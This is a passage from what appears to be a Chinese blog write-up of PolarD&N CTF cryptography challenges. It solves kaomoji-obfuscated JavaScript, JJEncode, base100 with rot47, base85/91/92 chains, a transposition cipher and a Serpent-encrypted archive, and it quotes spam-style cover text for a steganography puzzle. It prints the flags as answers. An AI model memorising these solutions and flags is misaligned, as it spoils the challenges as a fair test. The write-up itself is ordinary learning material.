(ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(ﾟｰﾟ)+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');</span><br></pre></td></tr></tbody></table></figure></details><p>颜文字加密</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224161512578.png" alt="image-20231224161512578"></p><p>看不懂是什么了，随波逐流看看</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224162037175.png" alt="image-20231224162037175"></p><p>JJEncode没怎么见过，找个网址：<a href="http://www.hiencode.com/jjencode.html">CTF在线工具-在线JJencode编码|JJ编码|JJencode解码|JJencode编码原理|JJencode编码算法 (hiencode.com)</a></p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224161658043.png" alt="image-20231224161658043"></p><p>xxxxxxxxxx1&nbsp;1flag{b5ff0893e6522a037c144a1f502c2b48}txt</p><p>继续随波逐流，UUencode编码</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224162246669.png" alt="image-20231224162246669"></p><p>xxencode编码</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224162338271.png" alt="image-20231224162338271"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{i+'s_N0t-hard}</span><br></pre></td></tr></tbody></table></figure><h1 id="base？"><a href="#base？" class="headerlink" title="base？"></a>base？</h1><p>题目</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">🐮🐴🐩🐯👃🐪🐫👞🐮🐫🐪🐭👞🐩🐬🐫🐭👟🐫👜🐭👙🐮👘🐩🐩👟👟🐫👖👟🐫🐪🐮👚👟🐫👅</span><br></pre></td></tr></tbody></table></figure><p>表情包可以用base100解密</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">7=28L34g7436g2546h4e6b7a22hh4_h437ch4N</span><br></pre></td></tr></tbody></table></figure><p>随波逐流发现rot47</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{bc8fcbe8adce9c6e3f2aa99c09cbf49c}</span><br></pre></td></tr></tbody></table></figure><h1 id="serpent"><a href="#serpent" class="headerlink" title="serpent"></a>serpent</h1><p>题目是一个压缩包，爆破密码得到8043</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224163115486.png" alt="image-20231224163115486"></p><p>以下内容来自偶像！密码神！<a href="https://www.cnblogs.com/mumuhhh/p/17818754.html">2023 PolarD&amp;N靶场通关笔记 Crypto - Kicky_Mu - 博客园 (cnblogs.com)</a></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">题目已经提示是Serpent密码，它是一个对称密钥块密码，这是在高级加密标准（AES）的较量，它被排在第二位，以Rijndael算法入围。Serpent是由罗斯·安德森，礼比哈姆，和Lars努森设计。像其他的AES意见书，Serpent具有128比特的块大小和支持的128,192或256位的密钥大小。所述的密码是32轮取代-置换网络的4个32位字块上的操作。每轮适用的8个4比特至4比特S-box的并行32倍之一。</span><br><span class="line">它的在线网站加/解密：http://serpent.online-domain-tools.com/。</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-jian-dan/3167109-20231109002237175-1915327935.png" alt="img"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{738b644d0492443bea6eed808c7dfdf4}</span><br></pre></td></tr></tbody></table></figure><h1 id="这是贝斯？"><a href="#这是贝斯？" class="headerlink" title="这是贝斯？"></a>这是贝斯？</h1><p>文件名为：85 91 92.txt</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">&lt;(^Xk.Npiq;E,pb:h!%7C-5'XB50kXB/jC8/l3s507#fo@pqc/=sZIXCG%qc2Cq-UGBtEH=&amp;A</span><br></pre></td></tr></tbody></table></figure><p>base85-&gt;base91-&gt;base92</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{6e2e7a4fa11f37adf30aac6f618d058c}</span><br></pre></td></tr></tbody></table></figure><h1 id="置换密码"><a href="#置换密码" class="headerlink" title="置换密码"></a>置换密码</h1><p>题目</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">89 108 103 102 97 123 101 117 97 48 95 51 109 115 95 95 48 83 125 50 49 97 116 33</span><br></pre></td></tr></tbody></table></figure><p>ASCII码值转字符</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">Ylgfa{eua0_3ms__0S}21at!</span><br></pre></td></tr></tbody></table></figure><p>试了栅栏不是，之前还做过置换，看样子密钥应该是“624135”，可以在表格中整出来</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224170442029.png" alt="image-20231224170442029"></p><p>flag{Y0u_a3e_s0_Sma2t1!}</p><p>还可以写脚本解决</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">text = <span class="string">'Ylgfa{eua0_3ms__0S}21at!'</span>   <span class="comment">#错序字符串</span></span><br><span class="line">code = [<span class="number">6</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>]   <span class="comment">#每一组的正确顺序</span></span><br><span class="line">res = <span class="built_in">list</span>(<span class="string">'Ylgfa{eua0_3ms__0S}21at!'</span>)</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):     <span class="comment">#串中共4组</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> code:</span><br><span class="line">        res[i * <span class="number">6</span> + j - <span class="number">1</span>] = text[cnt]  </span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">''</span>)</span><br><span class="line"><span class="comment"># flag{Y0u_a3e_s0_Sma2t1!}</span></span><br></pre></td></tr></tbody></table></figure><h1 id="Spam"><a href="#Spam" class="headerlink" title="Spam"></a>Spam</h1><p>题目</p><details><summary>点击查看</summary><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dear Friend , You made the right decision when you </span><br><span class="line">signed up for our club ! We will comply with all removal </span><br><span class="line">requests ! This mail is being sent in compliance with </span><br><span class="line">Senate bill 1622 ; Title 9 , Section 309 ! THIS IS </span><br><span class="line">NOT MULTI-LEVEL MARKETING . Why work for somebody else </span><br><span class="line">when you can become rich within 61 weeks ! Have you </span><br><span class="line">ever noticed nearly every commercial on television </span><br><span class="line">has a .com on in it &amp; nobody is getting any younger </span><br><span class="line">. Well, now is your chance to capitalize on this . </span><br><span class="line">We will help you use credit cards on your website and </span><br><span class="line">increase customer response by 200% . You can begin </span><br><span class="line">at absolutely no cost to you ! But don't believe us </span><br><span class="line">! Mrs Jones of Nebraska tried us and says "I've been </span><br><span class="line">poor and I've been rich - rich is better" . We assure </span><br><span class="line">you that we operate within all applicable laws . Don't </span><br><span class="line">delay - order today . Sign up a friend and you'll get </span><br><span class="line">a discount of 60% . Warmest regards . Dear Friend , </span><br><span class="line">We know you are interested in receiving hot announcement </span><br><span class="line">. If you no longer wish to receive our publications </span><br><span class="line">simply reply with a Subject: of "REMOVE" and you will </span><br><span class="line">immediately be removed from our club ! This mail is </span><br><span class="line">being sent in compliance with Senate bill 2516 , Title </span><br><span class="line">9 ; Section 303 . This is different than anything else </span><br><span class="line">you've seen ! Why work for somebody else when you can </span><br><span class="line">become rich within 89 days . Have you ever noticed </span><br><span class="line">the baby boomers are more demanding than their parents </span><br><span class="line">and the baby boomers are more demanding than their </span><br><span class="line">parents . Well, now is your chance to capitalize on </span><br><span class="line">this . WE will help YOU use credit cards on your website </span><br><span class="line">and sell more . You can begin at absolutely no cost </span><br><span class="line">to you ! But don't believe us ! Prof Ames of South </span><br><span class="line">Carolina tried us and says "My only problem now is </span><br><span class="line">where to park all my cars" ! This offer is 100% legal </span><br><span class="line">! For God's sake, order now . Sign up a friend and </span><br><span class="line">you get half off ! Best regards ! Dear Internet user </span><br><span class="line">; Especially for you - this red-hot intelligence ! </span><br><span class="line">This is a one time mailing there is no need to request </span><br><span class="line">removal if you won't want any more ! This mail is being </span><br><span class="line">sent in compliance with Senate bill 1625 ; Title 7 </span><br><span class="line">, Section 306 ! This is not a get rich scheme ! Why </span><br><span class="line">work for somebody else when you can become rich as </span><br><span class="line">few as 22 months ! Have you ever noticed people will </span><br><span class="line">do almost anything to avoid mailing their bills plus </span><br><span class="line">how many people you know are on the Internet . Well, </span><br><span class="line">now is your chance to capitalize on this ! WE will </span><br><span class="line">help YOU sell more and sell more ! You are guaranteed </span><br><span class="line">to succeed because we take all the risk ! But don't </span><br><span class="line">believe us . Prof Ames of Alaska tried us and says </span><br><span class="line">"Now I'm rich, Rich, RICH" ! We are a BBB member in </span><br><span class="line">good standing ! If not for you then for your LOVED </span><br><span class="line">ONES - act now . Sign up a friend and you get half </span><br><span class="line">off . Cheers ! Dear Internet user , Especially for </span><br><span class="line">you - this red-hot news . This is a one time mailing </span><br><span class="line">there is no need to request removal if you won't want </span><br><span class="line">any more ! This mail is being sent in compliance with </span><br><span class="line">Senate bill 1622 ; Title 6 ; Section 301 . THIS IS </span><br><span class="line">NOT A GET RICH SCHEME . Why work for somebody else </span><br><span class="line">when you can become rich inside 53 weeks . Have you </span><br><span class="line">ever noticed society seems to be moving faster and </span><br><span class="line">faster and the baby boomers are more demanding than </span><br><span class="line">their parents ! Well, now is your chance to capitalize </span><br><span class="line">on this . We will help you increase customer response </span><br><span class="line">by 190% &amp; SELL MORE . You can begin at absolutely no </span><br><span class="line">cost to you ! But don't believe us ! Prof Ames who </span><br><span class="line">resides in Arizona tried us and says "I've been poor </span><br><span class="line">and I've been rich - rich is better" ! This offer is </span><br><span class="line">100% legal . We IMPLORE you - act now . Sign up a friend </span><br><span class="line">and you'll get a discount of 70% ! Cheers . Dear Sir </span><br><span class="line">or Madam ; Your email address has been submitted to </span><br><span class="line">us indicating your interest in our briefing . If you </span><br><span class="line">no longer wish to receive our publications simply reply </span><br><span class="line">with a Subject: of "REMOVE" and you will immediately </span><br><span class="line">be removed from our directory ! This mail is being </span><br><span class="line">sent in compliance with Senate bill 1623 ; Title 9 </span><br><span class="line">; Section 302 . This is a ligitimate business proposal </span><br><span class="line">! Why work for somebody else when you can become rich </span><br><span class="line">within 37 days . Have you ever noticed how long the </span><br><span class="line">line-ups are at bank machines plus nobody is getting </span><br><span class="line">any younger ! Well, now is your chance to capitalize </span><br><span class="line">on this . WE will help YOU increase customer response </span><br><span class="line">by 170% and turn your business into an E-BUSINESS . </span><br><span class="line">You can begin at absolutely no cost to you ! But don't </span><br><span class="line">believe us . Mr Ames who resides in Wyoming tried us </span><br><span class="line">and says "I was skeptical but it worked for me" ! We </span><br><span class="line">are licensed to operate in all states . So make yourself </span><br><span class="line">rich now by ordering immediately ! Sign up a friend </span><br><span class="line">and your friend will be rich too . Thanks ! Dear Friend </span><br><span class="line">; Thank-you for your interest in our newsletter . If </span><br><span class="line">you are not interested in our publications and wish </span><br><span class="line">to be removed from our lists, simply do NOT respond </span><br><span class="line">and ignore this mail ! This mail is being sent in compliance </span><br><span class="line">with Senate bill 1621 , Title 2 ; Section 307 . This </span><br><span class="line">is not multi-level marketing ! Why work for somebody </span><br><span class="line">else when you can become rich as few as 61 WEEKS ! </span><br><span class="line">Have you ever noticed how many people you know are </span><br><span class="line">on the Internet and people love convenience . Well, </span><br><span class="line">now is your chance to capitalize on this ! We will </span><br><span class="line">help you sell more and SELL MORE . You can begin at </span><br><span class="line">absolutely no cost to you . But don't believe us ! </span><br><span class="line">Prof Jones who resides in Wisconsin tried us and says </span><br><span class="line">"My only problem now is where to park all my cars" </span><br><span class="line">. We are licensed to operate in all states . If not </span><br><span class="line">for you then for your loved ones - act now ! Sign up </span><br><span class="line">a friend and you get half off ! Best regards ! Dear </span><br><span class="line">Business person , Especially for you - this hot intelligence </span><br><span class="line">. If you are not interested in our publications and </span><br><span class="line">wish to be removed from our lists, simply do NOT respond </span><br><span class="line">and ignore this mail . This mail is being sent in compliance </span><br><span class="line">with Senate bill 2516 , Title 2 ; Section 304 . This </span><br><span class="line">is not a get rich scheme ! Why work for somebody else </span><br><span class="line">when you can become rich in 93 months . Have you ever </span><br><span class="line">noticed most everyone has a cellphone and people love </span><br><span class="line">convenience . Well, now is your chance to capitalize </span><br><span class="line">on this ! WE will help YOU increase customer response </span><br><span class="line">by 200% &amp; increase customer response by 160% . You </span><br><span class="line">can begin at absolutely no cost to you ! But don't </span><br><span class="line">believe us ! Mrs Jones who resides in Maryland tried </span><br><span class="line">us and says "My only problem now is where to park all </span><br><span class="line">my cars" ! We are a BBB member in good standing ! Do </span><br><span class="line">not go to sleep without ordering ! Sign up a friend </span><br><span class="line">and you'll get a discount of 40% . Thank-you for your </span><br><span class="line">serious consideration of our offer ! Dear Professional </span><br><span class="line">, Thank-you for your interest in our letter . If you </span><br><span class="line">no longer wish to receive our publications simply reply </span><br><span class="line">with a Subject: of "REMOVE" and you will immediately </span><br><span class="line">be removed from our directory ! This mail is being </span><br><span class="line">sent in compliance with Senate bill 1619 ; Title 5 </span><br><span class="line">, Section 302 ! This is not multi-level marketing ! </span><br><span class="line">Why work for somebody else when you can become rich </span><br><span class="line">inside 58 DAYS . Have you ever noticed people are much </span><br><span class="line">more likely to BUY with a credit card than cash and </span><br><span class="line">nearly every commercial on television has a .com on </span><br><span class="line">in it ! Well, now is your chance to capitalize on this </span><br><span class="line">! We will help you decrease perceived waiting time </span><br><span class="line">by 100% plus decrease perceived waiting time by 200% </span><br><span class="line">! You are guaranteed to succeed because we take all </span><br><span class="line">the risk . But don't believe us ! Mr Ames of West Virginia </span><br><span class="line">tried us and says "My only problem now is where to </span><br><span class="line">park all my cars" . We assure you that we operate within </span><br><span class="line">all applicable laws . We BESEECH you - act now ! Sign </span><br><span class="line">up a friend and you'll get a discount of 10% ! Thank-you </span><br><span class="line">for your serious consideration of our offer ! Dear </span><br><span class="line">Salaryman ; Especially for you - this hot announcement </span><br><span class="line">. This is a one time mailing there is no need to request </span><br><span class="line">removal if you won't want any more . This mail is being </span><br><span class="line">sent in compliance with Senate bill 2716 , Title 1 </span><br><span class="line">; Section 305 . This is not a get rich scheme . Why </span><br><span class="line">work for somebody else when you can become rich in </span><br><span class="line">36 months ! Have you ever noticed people will do almost </span><br><span class="line">anything to avoid mailing their bills &amp; more people </span><br><span class="line">than ever are surfing the web . Well, now is your chance </span><br><span class="line">to capitalize on this ! We will help you sell more </span><br><span class="line">and SELL MORE ! You can begin at absolutely no cost </span><br><span class="line">to you ! But don't believe us ! Mrs Ames who resides </span><br><span class="line">in West Virginia tried us and says "I was skeptical </span><br><span class="line">but it worked for me" ! We are licensed to operate </span><br><span class="line">in all states ! Do not delay - order today ! Sign up </span><br><span class="line">a friend and your friend will be rich too . Thanks </span><br><span class="line">. Dear Professional ; You made the right decision when </span><br><span class="line">you signed up for our club . If you are not interested </span><br><span class="line">in our publications and wish to be removed from our </span><br><span class="line">lists, simply do NOT respond and ignore this mail . </span><br><span class="line">This mail is being sent in compliance with Senate bill </span><br><span class="line">1623 , Title 1 , Section 304 . This is a ligitimate </span><br><span class="line">business proposal ! Why work for somebody else when </span><br><span class="line">you can become rich in 15 WEEKS ! Have you ever noticed </span><br><span class="line">most everyone has a cellphone &amp; nobody is getting any </span><br><span class="line">younger . Well, now is your chance to capitalize on </span><br><span class="line">this . WE will help YOU use credit cards on your website </span><br><span class="line">&amp; turn your business into an E-BUSINESS ! You are guaranteed </span><br><span class="line">to succeed because we take all the risk ! But don't </span><br><span class="line">believe us . Mr Anderson of Georgia tried us and says </span><br><span class="line">"Now I'm rich many more things are possible" . We assure </span><br><span class="line">you that we operate within all applicable laws . Do </span><br><span class="line">not go to sleep without ordering ! Sign up a friend </span><br><span class="line">and your friend will be rich too ! Cheers . Dear Salaryman </span><br><span class="line">, Your email address has been submitted to us indicating </span><br><span class="line">your interest in our publication ! If you no longer </span><br><span class="line">wish to receive our publications simply reply with </span><br><span class="line">a Subject: of "REMOVE" and you will immediately be </span><br><span class="line">removed from our club ! This mail is being sent in </span><br><span class="line">compliance with Senate bill 1623 , Title 6 , Section </span><br><span class="line">306 ! Do NOT confuse us with Internet scam artists </span><br><span class="line">. Why work for somebody else when you can become rich </span><br><span class="line">as few as 49 days ! Have you ever noticed people will </span><br><span class="line">do almost anything to avoid mailing their bills and </span><br><span class="line">people love 